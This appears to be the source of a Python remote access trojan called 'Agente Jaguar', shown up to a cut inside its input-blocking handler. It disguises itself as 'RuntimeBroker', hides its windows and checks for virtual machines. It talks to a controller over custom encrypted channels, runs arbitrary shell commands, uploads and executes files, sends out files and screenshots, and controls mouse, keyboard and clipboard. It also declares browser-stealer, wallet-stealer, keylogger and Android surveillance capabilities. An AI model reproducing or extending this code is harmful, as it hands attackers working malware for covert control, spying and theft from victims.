# -*- coding: utf-8 -*-
"""Agente Jaguar - payload cliente multiplataforma (v4).

DETECCION DE SISTEMA AL ARRANCAR:
  _detectar_entorno() fija SO, ES_WIN/ES_LINUX/ES_MAC/ES_ANDROID y el diccionario
  CAPS, que se publica en el handshake ("caps") para que el controlador sepa que
  puede usar en cada victima. El registro HANDLERS es el mismo en todos los SO:
  cada handler decide su implementacion o devuelve un error claro.

Cobertura:
  Windows  -> completo (HVNC desktop oculto, DPAPI, hook de teclado, GDI)
  Linux    -> completo salvo HVNC real (usa perfil aislado + ventana)
  macOS    -> Linux-like (xdotool/import si estan, o basic)
  Android  -> via Termux: screencap, input, getevent, termux-api (SMS, camara,
              micro, GPS, sensores, contactos, llamadas, portapapeles, TTS,
              notificaciones, vibrar, linterna, apps, persistencia Termux:Boot)

Novedades v4:
  - Rama ANDROID completa con ~38 comandos "movil_*".
  - Captura Android por 'screencap -p' (stdout, sin permisos de storage).
  - Keylogger Android por 'getevent -lt'.
  - Persistencia por plataforma (Run/schtasks, systemd/crontab/bashrc, Termux:Boot).
  - Deteccion de root Android para avisar de que el control tactil depende de el.
"""
import base64
import hashlib
import hmac
import io
import json
import os
import platform
import random
import re
import shutil
import socket
import sqlite3
import struct
import subprocess
import sys
import tempfile
import threading
import time
import zipfile

try:
    import getpass
except Exception:
    getpass = None

# ===========================================================================
#  DETECCION DE ENTORNO
# ===========================================================================
SO_RAW = platform.system().lower()
ES_WIN = SO_RAW.startswith("win")
ES_LINUX = SO_RAW.startswith("linux")
ES_MAC = SO_RAW.startswith("darwin")

ES_ANDROID = bool(
    os.environ.get("TERMUX_VERSION")
    or os.environ.get("PREFIX", "").startswith("/data/data/com.termux")
    or os.path.isdir("/data/data/com.termux")
)

SO = ("android" if ES_ANDROID else
      "windows" if ES_WIN else
      "linux" if ES_LINUX else
      "macos" if ES_MAC else SO_RAW)

CREATE_NO_WINDOW = 0x08000000
_TERMUX_API = None


def _tiene(binario):
    return bool(shutil.which(binario))


def _hay_termux_api():
    global _TERMUX_API
    if _TERMUX_API is None:
        _TERMUX_API = bool(shutil.which("termux-battery-status"))
    return _TERMUX_API


def _es_root_android():
    try:
        r = subprocess.run(["su", "-c", "id"], capture_output=True, text=True,
                           timeout=8)
        return "uid=0" in (r.stdout or "")
    except Exception:
        return False


def _android_info():
    def _get(prop, defecto=""):
        try:
            r = subprocess.run(["getprop", prop], capture_output=True, text=True,
                               timeout=6)
            return (r.stdout or "").strip() or defecto
        except Exception:
            return defecto
    return {
        "marca": _get("ro.product.brand"),
        "modelo": _get("ro.product.model"),
        "fabricante": _get("ro.product.manufacturer"),
        "android": _get("ro.build.version.release"),
        "sdk": _get("ro.build.version.sdk"),
        "build": _get("ro.build.display.id"),
        "operador": _get("gsm.operator.alpha"),
        "termux_api": _hay_termux_api(),
        "root": _es_root_android(),
    }


def _detectar_entorno():
    """Fija capacidades reales de ESTA maquina. Se envia al controlador."""
    caps = {
        "shell": True, "archivos": True, "captura": True, "stream": True,
        "proxy": True, "portscan": True, "spawn": True, "descarga": True,
        "persistencia": False, "keylogger": False, "raton": False,
        "teclado": False, "portapapeles": False, "webcam": False,
        "bloquear": False, "hvnc": False, "energia": False,
        "mensaje": False, "abrir_url": False, "wifi": False,
        "stealer_navegadores": False, "stealer_wallets": False,
        "root": False, "entorno_grafico": False, "movil": False,
    }
    try:
        caps["root"] = (os.geteuid() == 0) if hasattr(os, "geteuid") else True
    except Exception:
        caps["root"] = False

    if ES_WIN:
        caps.update({"persistencia": True, "keylogger": True, "raton": True,
                     "teclado": True, "portapapeles": True, "webcam": True,
                     "bloquear": True, "hvnc": True, "energia": True,
                     "mensaje": True, "abrir_url": True, "wifi": True,
                     "stealer_navegadores": True, "stealer_wallets": True,
                     "entorno_grafico": True})
        return caps

    # ---- Linux / macOS / Android ----
    caps["entorno_grafico"] = bool(os.environ.get("DISPLAY") or
                                   os.environ.get("WAYLAND_DISPLAY"))
    caps["portapapeles"] = (_tiene("xclip") or _tiene("xsel") or _tiene("wl-paste")
                            or _tiene("termux-clipboard-get"))
    caps["raton"] = caps["teclado"] = (_tiene("xdotool") or _tiene("ydotool")
                                       or ES_ANDROID)
    caps["captura"] = caps["stream"] = bool(
        ES_ANDROID or _tiene("scrot") or _tiene("import") or _tiene("grim")
        or _tiene("gnome-screenshot") or caps["entorno_grafico"])
    caps["keylogger"] = (_tiene("getevent") or _tiene("xinput") or caps["root"]
                         or os.path.isdir("/dev/input"))
    caps["persistencia"] = (_tiene("systemctl") or _tiene("crontab") or ES_ANDROID)
    caps["mensaje"] = (_tiene("zenity") or _tiene("notify-send")
                       or _tiene("xmessage") or _tiene("termux-toast"))
    caps["abrir_url"] = _tiene("xdg-open") or _tiene("open") or ES_ANDROID
    caps["energia"] = _tiene("systemctl") or _tiene("shutdown") or ES_MAC or ES_ANDROID
    try:
        import cv2  # noqa
        caps["webcam"] = True
    except Exception:
        caps["webcam"] = bool(_hay_termux_api())
    caps["wifi"] = _tiene("nmcli") or _tiene("iw") or _tiene("iwconfig") or _hay_termux_api()
    caps["stealer_navegadores"] = os.path.isdir(os.path.expanduser("~/.config"))
    caps["stealer_wallets"] = caps["stealer_navegadores"]
    caps["bloquear"] = _tiene("xtrlock") or _tiene("xdotool")

    if ES_ANDROID:
        caps.update({
            "movil": True, "captura": True, "stream": True,
            "raton": True, "teclado": True, "keylogger": True,
            "persistencia": True, "energia": True, "abrir_url": True,
            "webcam": bool(_hay_termux_api()),
            "portapapeles": bool(_hay_termux_api()),
            "mensaje": bool(_hay_termux_api()),
            "wifi": bool(_hay_termux_api()),
            "bloquear": False, "hvnc": False,
            "entorno_grafico": True,
            "stealer_navegadores": False, "stealer_wallets": False,
            "root": _es_root_android(),
        })
        return caps

    caps["hvnc"] = caps["entorno_grafico"]
    return caps


CAPS = _detectar_entorno()

HOST = os.environ.get("JAGUAR_HOST", "127.0.0.1")
try:
    PORT = int(os.environ.get("JAGUAR_PORT", "8000"))
except Exception:
    PORT = 8000
FALLBACK = os.environ.get("JAGUAR_HOST2", "")
SLEEP = 3.0
JITTER = 0.2
NOMBRE = "RuntimeBroker" if ES_WIN else "jaguar-agent"
_WIN = ES_WIN

_HOME = os.path.expanduser("~")
if ES_WIN:
    DIR_PERSIST = os.path.join(os.environ.get("APPDATA", _HOME),
                               "Microsoft", "Windows", NOMBRE)
else:
    DIR_PERSIST = os.path.join(_HOME, ".local", "share", NOMBRE)

DIR_LOG = DIR_PERSIST
RUTA_LOG = os.path.join(DIR_LOG, "jaguar.log")
_MAX_LOG = 1_000_000

_KLOG = []
_KLOG_ON = False
_PROXY_ON = False
_SALIR = False
_BLOQ = {"on": False}
_WCAM = {"on": False, "frame": b"", "w": 0, "h": 0}
_CAP_CFG = {"calidad": 70, "escala": 1.0}

_LOCK_ENVIO = threading.Lock()
_SOCK_ACT = {"s": None}
_TEMP_STEAL = None
_STREAM = {"hvnc": {"on": False, "fps": 10},
           "escritorio": {"on": False, "fps": 5}}


def _sin_consola():
    if not ES_WIN:
        return {}
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0
    return {"startupinfo": si, "creationflags": CREATE_NO_WINDOW}


# ====================== CRIPTO (identico al controlador) ====================
_K_OBF = bytes([
    0x10, 0x6E, 0x1D, 0x0F, 0x6E, 0x08, 0x77, 0x68, 0x6A, 0x68,
    0x6C, 0x77, 0x39, 0x36, 0x3B, 0x2C, 0x3F, 0x77, 0x39, 0x35,
    0x37, 0x2A, 0x3B, 0x28, 0x2E, 0x33, 0x3E, 0x3B,
])
_CLAVE_MAESTRA = bytes(b ^ 0x5A for b in _K_OBF)
_SAL = b"jaguar-v1"
_ITER = 100_000
_CI = None
_MA = None


def _cinit():
    global _CI, _MA
    if _CI is None:
        m = hashlib.pbkdf2_hmac("sha256", _CLAVE_MAESTRA, _SAL, _ITER, dklen=64)
        _CI, _MA = m[:32], m[32:]


def _ks(nonce, n):
    _cinit()
    out = bytearray()
    c = 0
    while len(out) < n:
        out += hmac.new(_CI, nonce + struct.pack(">Q", c), hashlib.sha256).digest()
        c += 1
    return bytes(out[:n])


def _xor(a, b):
    if not a:
        return b""
    return (int.from_bytes(a, "big") ^ int.from_bytes(b, "big")).to_bytes(len(a), "big")


def cifrar(datos):
    _cinit()
    if isinstance(datos, str):
        datos = datos.encode("utf-8")
    pad = os.urandom(os.urandom(1)[0])
    cuerpo = struct.pack(">H", len(pad)) + pad + datos
    nonce = os.urandom(16)
    ct = _xor(cuerpo, _ks(nonce, len(cuerpo)))
    mac = hmac.new(_MA, nonce + ct, hashlib.sha256).digest()
    return nonce + ct + mac


def descifrar(blob):
    _cinit()
    if len(blob) < 48:
        raise ValueError("trama corta")
    nonce, ct, mac = blob[:16], blob[16:-32], blob[-32:]
    if not hmac.compare_digest(mac, hmac.new(_MA, nonce + ct, hashlib.sha256).digest()):
        raise ValueError("MAC invalido")
    cuerpo = _xor(ct, _ks(nonce, len(ct)))
    return cuerpo[2 + struct.unpack(">H", cuerpo[:2])[0]:]
# ============================================================================


def _recv(sock, n):
    b = b""
    while len(b) < n:
        c = sock.recv(n - len(b))
        if not c:
            return None
        b += c
    return b


def _enviar(sock, obj):
    d = json.dumps(obj, ensure_ascii=False).encode("utf-8")
    c = cifrar(d)
    paquete = struct.pack(">I", len(c)) + c
    with _LOCK_ENVIO:
        sock.sendall(paquete)


def _enviar_evento(evento, datos):
    s = _SOCK_ACT.get("s")
    if not s:
        return
    try:
        _enviar(s, {"tipo": "evento", "evento": evento, "datos": datos})
    except Exception:
        pass


def _recibir(sock):
    cab = _recv(sock, 4)
    if not cab:
        return None
    (n,) = struct.unpack(">I", cab)
    d = _recv(sock, n)
    if d is None:
        return None
    try:
        return json.loads(descifrar(d).decode("utf-8"))
    except Exception:
        return {}


def _log(nivel, txt):
    try:
        os.makedirs(DIR_LOG, exist_ok=True)
        if os.path.isfile(RUTA_LOG) and os.path.getsize(RUTA_LOG) > _MAX_LOG:
            try:
                os.replace(RUTA_LOG, RUTA_LOG + ".1")
            except Exception:
                pass
        with open(RUTA_LOG, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [{nivel}] {txt}\n")
    except Exception:
        pass


def _log_leer(a):
    n = int(a.get("lineas", 200))
    try:
        with open(RUTA_LOG, encoding="utf-8", errors="replace") as f:
            return {"ruta": RUTA_LOG, "texto": "".join(f.readlines()[-n:])}
    except Exception as e:
        return {"error": str(e), "ruta": RUTA_LOG}


# ===========================================================================
#  Helpers de sistema
# ===========================================================================
def _cmd_out(comando, timeout=25):
    try:
        r = subprocess.run(comando, shell=True, capture_output=True, text=True,
                           timeout=timeout, **_sin_consola())
        return ((r.stdout or "") + (r.stderr or "")).strip()
    except Exception as e:
        return f"[error] {e}"


def _ps(comando, timeout=30):
    if not ES_WIN:
        return _cmd_out(comando, timeout)
    try:
        r = subprocess.run(["powershell", "-NoP", "-C", comando],
                           capture_output=True, text=True, timeout=timeout,
                           **_sin_consola())
        return (r.stdout or "").strip() or (r.stderr or "").strip()
    except Exception as e:
        return f"[error] {e}"


def _root_cmd(comando, timeout=25):
    """Android: usa su si hay root; resto: directo."""
    if ES_ANDROID and _es_root_android():
        return _cmd_out(f'su -c "{comando}"', timeout)
    return _cmd_out(comando, timeout)


def _tx(*args, **kw):
    """Ejecuta un comando termux-api. Devuelve (ok, texto)."""
    try:
        r = subprocess.run(list(args), capture_output=True, text=True,
                           timeout=kw.get("timeout", 30))
        return r.returncode == 0, ((r.stdout or "") + (r.stderr or "")).strip()
    except Exception as e:
        return False, str(e)


def _tx_json(*args):
    ok, txt = _tx(*args)
    if not txt:
        return None
    try:
        return json.loads(txt)
    except Exception:
        return None


def _cfg():
    """Lee host/puerto/fallback de argv IGNORANDO flags (--jaguar-detached, etc.)."""
    args = [a for a in sys.argv[1:] if not a.startswith("-")]
    host = args[0] if len(args) > 0 else HOST
    try:
        puerto = int(args[1]) if len(args) > 1 else PORT
    except Exception:
        puerto = PORT
    fb = args[2] if len(args) > 2 else FALLBACK
    return (host or "127.0.0.1"), puerto, (fb or "")


def _ip_interna():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def _usuario():
    try:
        return getpass.getuser() if getpass else (os.environ.get("USER")
                                                  or os.environ.get("USERNAME") or "?")
    except Exception:
        return os.environ.get("USER") or os.environ.get("USERNAME") or "?"


def _distro():
    if not ES_LINUX:
        return ""
    try:
        with open("/etc/os-release", encoding="utf-8", errors="replace") as f:
            for ln in f:
                if ln.startswith("PRETTY_NAME="):
                    return ln.split("=", 1)[1].strip().strip('"')
    except Exception:
        pass
    return platform.platform()


def _sysinfo():
    if ES_ANDROID:
        a = _android_info()
        so_txt = f"Android {a.get('android', '?')} ({a.get('marca', '')} {a.get('modelo', '')})"
    elif ES_LINUX:
        so_txt = _distro() or f"Linux {platform.release()}"
    else:
        so_txt = f"{platform.system()} {platform.release()}"
    return {
        "host": socket.gethostname(),
        "usuario": _usuario(),
        "so": so_txt,
        "kernel": platform.release(),
        "arquitectura": platform.machine(),
        "ip": _ip_interna(),
        "pid": os.getpid(),
        "exe": sys.executable,
        "cwd": os.getcwd(),
        "plataforma": SO,
        "android": _android_info() if ES_ANDROID else {},
        "caps": CAPS,
    }


def _es_vm():
    try:
        if ES_WIN:
            t = _cmd_out("wmic computersystem get model,manufacturer").lower()
        elif ES_ANDROID:
            return False
        else:
            t = _cmd_out("systemd-detect-virt").lower()
            if not t or "none" in t:
                with open("/sys/class/dmi/id/product_name",
                          encoding="utf-8", errors="replace") as f:
                    t = f.read().lower()
        return any(k in t for k in ("vmware", "virtualbox", "vbox", "qemu", "xen",
                                    "kvm", "hyper-v", "virtual machine", "bhyve"))
    except Exception:
        return False


def _uptime():
    try:
        if ES_WIN:
            return _ps("(Get-CimInstance Win32_OperatingSystem).LastBootUpTime")
        if ES_ANDROID:
            return _cmd_out("uptime")
        with open("/proc/uptime") as f:
            return f"{float(f.read().split()[0]) / 3600:.1f} h"
    except Exception:
        return "?"


# ------------------------------------------------------------------ handlers
def _ping(a):
    return {"ts": a.get("ts"), "so": SO}


def _shell(a):
    r = subprocess.run(a.get("comando", ""), shell=True, capture_output=True,
                       text=True, **_sin_consola())
    return {"salida": (r.stdout or "") + (r.stderr or ""), "codigo": r.returncode}


def _listar_dir(a):
    ruta = a.get("ruta", ".") or "."
    try:
        items = []
        for e in os.scandir(ruta):
            try:
                items.append({"nombre": e.name, "dir": e.is_dir(),
                              "tamano": e.stat().st_size})
            except Exception:
                items.append({"nombre": e.name, "dir": e.is_dir(), "tamano": 0})
        return {"ruta": os.path.abspath(ruta), "items": items}
    except Exception as e:
        return {"error": str(e)}


def _procesos(a):
    try:
        if ES_WIN:
            cmd = ["tasklist"]
        elif ES_ANDROID:
            cmd = ["ps", "-A", "-o", "PID,USER,NAME"]
        else:
            cmd = ["ps", "aux"]
        r = subprocess.run(cmd, capture_output=True, text=True, **_sin_consola())
        return {"salida": r.stdout}
    except Exception as e:
        return {"error": str(e)}


def _descargar(a):
    with open(a.get("ruta", ""), "rb") as f:
        d = f.read()
    return {"nombre": os.path.basename(a.get("ruta", "")),
            "b64": base64.b64encode(d).decode(), "tamano": len(d)}


def _subir_ejecutar(a):
    d = base64.b64decode(a.get("b64", ""))
    ruta = os.path.join(tempfile.gettempdir(), a.get("nombre", "archivo.bin"))
    with open(ruta, "wb") as f:
        f.write(d)
    try:
        os.chmod(ruta, 0o755)
    except Exception:
        pass
    try:
        subprocess.Popen([ruta], shell=ES_WIN, **_sin_consola())
    except Exception:
        pass
    return {"ruta": ruta}


def _spawn(a):
    exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
    try:
        subprocess.Popen([exe] + (sys.argv[1:3] if len(sys.argv) > 2 else []),
                         **_sin_consola())
    except Exception as e:
        return {"error": str(e)}
    return {"estado": "spawn", "exe": exe}


def _energia(a):
    modo = (a.get("modo") or "reiniciar").lower()
    if ES_WIN:
        cmds = {"apagar": "shutdown /s /t 5 /f", "reiniciar": "shutdown /r /t 5 /f",
                "logoff": "shutdown /l /f", "hibernar": "shutdown /h",
                "bloquear": "rundll32.exe user32.dll,LockWorkStation",
                "suspender": "rundll32.exe powrprof.dll,SetSuspendState 0,1,0"}
    elif ES_ANDROID:
        cmds = {"apagar": "reboot -p", "reiniciar": "reboot",
                "logoff": "am start -a android.intent.action.MAIN -c "
                          "android.intent.category.HOME",
                "bloquear": "input keyevent 26"}
    elif ES_LINUX:
        cmds = {"apagar": "systemctl poweroff", "reiniciar": "systemctl reboot",
                "logoff": "pkill -u " + _usuario(),
                "bloquear": "loginctl lock-session",
                "suspender": "systemctl suspend", "hibernar": "systemctl hibernate"}
    else:
        cmds = {"apagar": "osascript -e 'tell app \"System Events\" to shut down'",
                "reiniciar": "osascript -e 'tell app \"System Events\" to restart'",
                "logoff": "osascript -e 'tell app \"System Events\" to log out'"}
    try:
        if ES_ANDROID:
            _root_cmd(cmds.get(modo, cmds["reiniciar"]))
        else:
            subprocess.Popen(cmds.get(modo, cmds.get("reiniciar")), shell=True,
                             **_sin_consola())
    except Exception as e:
        return {"error": str(e)}
    return {"estado": modo}


def _beacon_kill(a):
    threading.Timer(0.4, lambda: os._exit(0)).start()
    return {"estado": "matando proceso"}


def _beacon_reconectar(a):
    try:
        _SOCK_ACT["s"].close()
    except Exception:
        pass
    return {"estado": "reconectando"}


# ===========================================================================
#  Captura de pantalla
# ===========================================================================
def _tamano_png(raw):
    try:
        if raw[:8] == b"\x89PNG\r\n\x1a\n":
            return (int.from_bytes(raw[16:20], "big"),
                    int.from_bytes(raw[20:24], "big"))
    except Exception:
        pass
    return 0, 0


def _comprimir(raw, w, h, fmt="jpeg", calidad=70, escala=1.0):
    try:
        import cv2
        import numpy as np
        arr = cv2.imdecode(np.frombuffer(raw, dtype=np.uint8), cv2.IMREAD_COLOR)
        if arr is None:
            return raw, w, h
        h, w = arr.shape[:2]
        if escala != 1.0:
            arr = cv2.resize(arr, None, fx=escala, fy=escala,
                             interpolation=cv2.INTER_LINEAR)
        if fmt == "jpeg":
            ok, out = cv2.imencode(".jpg", arr,
                                   [int(cv2.IMWRITE_JPEG_QUALITY), calidad])
            if ok:
                return out.tobytes(), w, h
        return raw, w, h
    except Exception:
        pass
    try:
        from PIL import Image
        img = Image.open(io.BytesIO(raw))
        w, h = img.size
        if escala != 1.0:
            img = img.resize((max(1, int(w * escala)), max(1, int(h * escala))))
        bio = io.BytesIO()
        if fmt == "jpeg":
            img.convert("RGB").save(bio, "JPEG", quality=calidad)
        else:
            img.save(bio, "PNG")
        return bio.getvalue(), w, h
    except Exception:
        return raw, w, h


def _captura_android(fmt="png", calidad=70, escala=1.0):
    try:
        r = subprocess.run(["screencap", "-p"], capture_output=True, timeout=25)
        raw = r.stdout
    except Exception as e:
        return {"b64": "", "error": str(e), "w": 0, "h": 0}
    if not raw:
        return {"b64": "", "error": "screencap sin salida", "w": 0, "h": 0}
    w, h = _tamano_png(raw)
    if not w:
        ok, salida = _tx("wm", "size")
        m = re.search(r"(\d+)x(\d+)", salida or "")
        if m:
            w, h = int(m.group(1)), int(m.group(2))
    raw, w, h = _comprimir(raw, w, h, fmt, calidad, escala)
    return {"b64": base64.b64encode(raw).decode(), "w": w, "h": h}


def _captura_linux(fmt="png", calidad=70, escala=1.0):
    destino = os.path.join(tempfile.gettempdir(), "jaguar_cap." + fmt)
    try:
        os.remove(destino)
    except OSError:
        pass
    candidatos = []
    if os.environ.get("WAYLAND_DISPLAY") and _tiene("grim"):
        candidatos.append(["grim", destino])
    if _tiene("scrot"):
        candidatos.append(["scrot", "-q", str(calidad), destino])
    if _tiene("import"):
        candidatos.append(["import", "-window", "root", destino])
    if _tiene("gnome-screenshot"):
        candidatos.append(["gnome-screenshot", "-f", destino])
    for cmd in candidatos:
        try:
            subprocess.run(cmd, capture_output=True, timeout=20)
            if os.path.isfile(destino) and os.path.getsize(destino) > 0:
                with open(destino, "rb") as f:
                    raw = f.read()
                w = h = 0
                try:
                    from PIL import Image
                    w, h = Image.open(io.BytesIO(raw)).size
                except Exception:
                    pass
                raw, w, h = _comprimir(raw, w, h, fmt, calidad, escala)
                return {"b64": base64.b64encode(raw).decode(), "w": w, "h": h}
        except Exception:
            continue
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        w, h = img.width, img.height
        if escala != 1.0:
            img = img.resize((max(1, int(w * escala)), max(1, int(h * escala))))
        buf = io.BytesIO()
        img.convert("RGB").save(buf, "JPEG" if fmt == "jpeg" else "PNG",
                                **({"quality": calidad} if fmt == "jpeg" else {}))
        return {"b64": base64.b64encode(buf.getvalue()).decode(), "w": w, "h": h}
    except Exception as e:
        return {"b64": "", "error": str(e)}


def _captura_win(a, fmt="png", calidad=70, escala=1.0):
    try:
        from PIL import ImageGrab
        try:
            img = ImageGrab.grab(all_screens=True)
        except TypeError:
            img = ImageGrab.grab()
    except Exception:
        img = None
    if img is None:
        return _captura_win_gdi(a)
    w, h = img.width, img.height
    if escala != 1.0:
        img = img.resize((max(1, int(w * escala)), max(1, int(h * escala))))
    buf = io.BytesIO()
    try:
        if fmt == "jpeg":
            img.convert("RGB").save(buf, "JPEG", quality=calidad)
        else:
            img.save(buf, "PNG")
    except Exception as e:
        return {"b64": "", "error": str(e)}
    return {"b64": base64.b64encode(buf.getvalue()).decode(), "w": w, "h": h}


def _captura_win_gdi(a):
    import ctypes
    from ctypes import wintypes
    u = ctypes.windll.user32
    g = ctypes.windll.gdi32
    hwnd = u.GetDesktopWindow()
    hdc = u.GetWindowDC(hwnd)
    w = u.GetSystemMetrics(0)
    h = u.GetSystemMetrics(1)
    memdc = g.CreateCompatibleDC(hdc)
    bmp = g.CreateCompatibleBitmap(hdc, w, h)
    g.SelectObject(memdc, bmp)
    g.BitBlt(memdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)

    class BIH(ctypes.Structure):
        _fields_ = [("biSize", wintypes.DWORD), ("biWidth", wintypes.LONG),
                    ("biHeight", wintypes.LONG), ("biPlanes", wintypes.WORD),
                    ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                    ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", wintypes.LONG),
                    ("biYPelsPerMeter", wintypes.LONG), ("biClrUsed", wintypes.DWORD),
                    ("biClrImportant", wintypes.DWORD)]

    bi = BIH()
    bi.biSize = ctypes.sizeof(BIH)
    bi.biWidth = w
    bi.biHeight = -h
    bi.biPlanes = 1
    bi.biBitCount = 32
    buf = ctypes.create_string_buffer(w * h * 4)
    g.GetDIBits(memdc, bmp, 0, h, buf, ctypes.byref(bi), 0)
    g.DeleteObject(bmp)
    g.DeleteDC(memdc)
    u.ReleaseDC(hwnd, hdc)
    try:
        from PIL import Image
        img = Image.frombuffer("RGBA", (w, h), buf, "raw", "BGRA", 0, 1)
        b = io.BytesIO()
        img.convert("RGB").save(b, "PNG")
        return {"b64": base64.b64encode(b.getvalue()).decode(), "w": w, "h": h}
    except Exception:
        return {"b64": "", "w": w, "h": h}


def _captura(a):
    fmt = (a.get("formato") or "png").lower()
    calidad = int(a.get("calidad", _CAP_CFG["calidad"]))
    escala = float(a.get("escala", _CAP_CFG["escala"])) or 1.0
    if ES_WIN:
        return _captura_win(a, fmt, calidad, escala)
    if ES_ANDROID:
        return _captura_android(fmt, calidad, escala)
    return _captura_linux(fmt, calidad, escala)


# ===========================================================================
#  Raton / teclado / portapapeles / bloqueo
# ===========================================================================
def _raton(a):
    if ES_WIN:
        return _raton_win(a)
    if ES_ANDROID:
        return _raton_android(a)
    return _raton_xdo(a)


def _raton_win(a):
    import ctypes
    u = ctypes.windll.user32
    accion = a.get("accion")
    if "x" in a and "y" in a:
        u.SetCursorPos(int(a["x"]), int(a["y"]))
    if accion == "down":
        u.mouse_event(0x0002, 0, 0, 0, 0)
    elif accion == "up":
        u.mouse_event(0x0004, 0, 0, 0, 0)
    elif accion == "right_down":
        u.mouse_event(0x0008, 0, 0, 0, 0)
    elif accion == "right_up":
        u.mouse_event(0x0010, 0, 0, 0, 0)
    elif accion == "doble":
        for _ in range(2):
            u.mouse_event(0x0002, 0, 0, 0, 0)
            u.mouse_event(0x0004, 0, 0, 0, 0)
    elif accion == "scroll":
        u.mouse_event(0x0800, 0, 0, int(a.get("delta", 120)), 0)
    return {}


def _xdo():
    return "xdotool" if _tiene("xdotool") else ("ydotool" if _tiene("ydotool") else "")


def _raton_xdo(a):
    xdo = _xdo()
    if not xdo:
        return {"error": "instala xdotool"}
    accion = a.get("accion")
    try:
        if "x" in a and "y" in a:
            subprocess.run([xdo, "mousemove", str(int(a["x"])), str(int(a["y"]))],
                           capture_output=True, timeout=6)
        boton = {"down": "1", "right_down": "3"}.get(accion)
        subir = {"up": "1", "right_up": "3"}.get(accion)
        if boton:
            subprocess.run([xdo, "mousedown", boton], capture_output=True, timeout=6)
        if subir:
            subprocess.run([xdo, "mouseup", subir], capture_output=True, timeout=6)
        if accion == "doble":
            subprocess.run([xdo, "click", "--repeat", "2", "1"],
                           capture_output=True, timeout=6)
        if accion == "scroll":
            b = "4" if int(a.get("delta", 120)) > 0 else "5"
            subprocess.run([xdo, "click", "--repeat", "3", b],
                           capture_output=True, timeout=6)
    except Exception as e:
        return {"error": str(e)}
    return {}


def _raton_android(a):
    accion = a.get("accion")
    x, y = int(a.get("x", 0)), int(a.get("y", 0))
    try:
        if accion in ("down", "right_down"):
            _root_cmd(f"input tap {x} {y}", timeout=12)
        elif accion == "doble":
            _root_cmd(f"input tap {x} {y}", timeout=12)
            time.sleep(0.12)
            _root_cmd(f"input tap {x} {y}", timeout=12)
        elif accion == "scroll":
            dy = 300 if int(a.get("delta", 120)) > 0 else -300
            _root_cmd(f"input swipe {x} {y} {x} {y + dy} 250", timeout=15)
    except Exception as e:
        return {"error": str(e)}
    return {}


def _teclado(a):
    if ES_WIN:
        import ctypes
        u = ctypes.windll.user32
        UP, UNI = 0x0002, 0x0004
        if "vk" in a:
            vk = int(a["vk"])
            u.keybd_event(vk, 0, 0, 0)
            u.keybd_event(vk, 0, UP, 0)
        elif "texto" in a:
            for ch in a["texto"]:
                u.keybd_event(0, ord(ch), UNI, 0)
                u.keybd_event(0, ord(ch), UNI | UP, 0)
        return {}
    if ES_ANDROID:
        if "texto" in a:
            txt = str(a["texto"]).replace(" ", "%s")
            _root_cmd(f"input text '{txt}'", timeout=15)
        elif "vk" in a:
            _root_cmd(f"input keyevent {int(a['vk'])}", timeout=12)
        return {}
    xdo = _xdo()
    if not xdo:
        return {"error": "instala xdotool"}
    mapa = {0x0D: "Return", 0x08: "BackSpace", 0x09: "Tab", 0x1B: "Escape",
            0x2E: "Delete", 0x25: "Left", 0x26: "Up", 0x27: "Right", 0x28: "Down",
            0x24: "Home", 0x23: "End", 0x20: "space"}
    try:
        if "vk" in a:
            subprocess.run([xdo, "key", mapa.get(int(a["vk"]), str(int(a["vk"])))],
                           capture_output=True, timeout=6)
        elif "texto" in a:
            subprocess.run([xdo, "type", "--clearmodifiers", a["texto"]],
                           capture_output=True, timeout=10)
    except Exception as e:
        return {"error": str(e)}
    return {}


_SWAP = {"on": False}


def _swap_raton(a):
    if not ES_WIN:
        return {"error": "solo Windows"}
    import ctypes
    _SWAP["on"] = not _SWAP["on"]
    ctypes.windll.user32.SwapMouseButton(1 if _SWAP["on"] else 0)
    return {"estado": "swap", "on": _SWAP["on"]}


def _clip_get(a):
    if ES_WIN:
        import ctypes
        u = ctypes.windll.user32
        k = ctypes.windll.kernel32
        if not u.OpenClipboard(0):
            return {"texto": ""}
        try:
            h = u.GetClipboardData(13)
            if not h:
                return {"texto": ""}
            p = k.GlobalLock(h)
            txt = ctypes.wstring_at(p) if p else ""
            k.GlobalUnlock(h)
            return {"texto": txt}
        finally:
            u.CloseClipboard()
    if ES_ANDROID:
        ok, txt = _tx("termux-clipboard-get", timeout=15)
        return {"texto": txt if ok else "", "error": None if ok else txt}
    for cmd in (["wl-paste", "-n"], ["xclip", "-selection", "clipboard", "-o"],
                ["xsel", "-b"]):
        if _tiene(cmd[0]):
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
                if r.returncode == 0:
                    return {"texto": r.stdout}
            except Exception:
                continue
    return {"texto": ""}


def _clip_set(a):
    txt = str(a.get("texto", ""))
    if ES_WIN:
        import ctypes
        u = ctypes.windll.user32
        k = ctypes.windll.kernel32
        if not u.OpenClipboard(0):
            return {}
        try:
            u.EmptyClipboard()
            datos = (txt + "\x00").encode("utf-16-le")
            h = k.GlobalAlloc(0x0002, len(datos))
            p = k.GlobalLock(h)
            ctypes.memmove(p, datos, len(datos))
            k.GlobalUnlock(h)
            u.SetClipboardData(13, h)
        finally:
            u.CloseClipboard()
        return {"ok": True}
    if ES_ANDROID:
        ok, out = _tx("termux-clipboard-set", txt, timeout=15)
        return {"ok": ok, "salida": out}
    for cmd in (["wl-copy"], ["xclip", "-selection", "clipboard"], ["xsel", "-bi"]):
        if _tiene(cmd[0]):
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE)
                p.communicate(txt.encode())
                return {"ok": True}
            except Exception:
                continue
    return {"error": "instala xclip / wl-clipboard"}


def _bloquear(a):
    if ES_WIN:
        import ctypes
        _BLOQ["on"] = not _BLOQ["on"]
        try:
            ctypes.windll.user32.BlockInput(_BLOQ["on"])
        except Exception:
            pass
        return {"bloqueado": _BLOQ["on"]}
    if ES_ANDROID:
        _root_cmd("input keyevent 26", timeout=12)
